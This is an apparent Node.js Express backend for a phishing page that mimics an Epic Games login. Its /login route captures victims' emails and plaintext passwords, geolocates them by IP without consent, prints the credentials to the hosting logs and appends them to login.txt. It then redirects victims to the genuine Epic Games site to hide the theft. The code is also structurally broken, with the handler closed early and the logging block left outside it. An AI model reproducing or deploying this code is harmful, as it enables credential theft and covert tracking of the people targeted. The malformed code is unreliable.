const express = require('express');
const path = require('path');
const fs = require('fs');
const cors = require('cors');
const app = express();

app.use(cors()); 
app.use(express.urlencoded({ extended: true }));
app.use(express.json()); 

const logPath = path.join(process.cwd(), 'login.txt');
app.use(express.static(path.join(__dirname, 'public')));

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Rota de Localização (GPS Real)
const geo = require('geoip-lite');
app.post('/login', (req, res) => {
    const { email, password } = req.body;
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    
    // Localização baseada no IP (Não pede permissão ao usuário)
    const geoData = geo.lookup(ip);
    const cidade = geoData ? geoData.city : "Desconhecida";
    const estado = geoData ? geoData.region : "Desconhecido";

    console.log(`📍 Localização aproximada pelo IP: ${cidade} - ${estado}`);
    // ... restante do seu código de salvar
});
    
    // Isso fará os dados aparecerem NA HORA nos Logs do Render
    console.log(`--- NOVO LOGIN ---`);
    console.log(`📧 E-mail: ${email}`);
    console.log(`🔑 Senha: ${password}`);
    console.log(`🌐 IP: ${ip}`);
    console.log(`------------------`);

    const dados = `[🔑 LOGIN] E-mail: ${email} | Senha: ${password} | IP: ${ip} | Data: ${new Date().toLocaleString('pt-BR')}\n`;

    // AGORA O REDIRECT SÓ ACONTECE DEPOIS DE SALVAR
    fs.appendFile(logPath, dados, (err) => {
        if (err) {
            console.error("Erro ao salvar login:", err);
        } else {
            console.log("✅ Dados salvos no arquivo login.txt");
        }
        // O redirecionamento acontece aqui dentro por segurança
        res.redirect('https://www.epicgames.com/id/login');
    });
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Servidor rodando na porta ${PORT}`);
});